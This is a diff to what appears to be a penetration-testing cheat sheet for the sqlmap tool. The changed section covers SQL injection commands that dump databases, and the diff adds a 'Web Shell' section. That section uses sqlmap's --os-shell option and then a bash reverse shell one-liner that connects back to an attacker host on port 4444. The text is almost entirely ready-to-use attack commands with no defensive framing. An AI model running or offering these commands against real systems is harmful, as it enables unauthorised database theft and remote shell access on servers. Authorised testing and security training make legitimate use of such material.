@@ -57,3 +57,17 @@ sqlmap -r request.txt --risk=3 --level=5 --dump
 ```sh
 sqlmap -u "http://10.0.0.1/?category=test&item=1" -p item 
 ```
+
+<br />
+
+## Web Shell (--os-shell)
+
+```sh
+
+sqlmap -u "http://10.0.0.1" --cookie="value=*" --os-shell
+
+# ------ Activate --------------------------
+
+# Reverse shell again to get the full functional shell
+os-shell> bash -c 'bash -i >& /dev/tcp/10.0.0.2/4444 0>&1'
+```
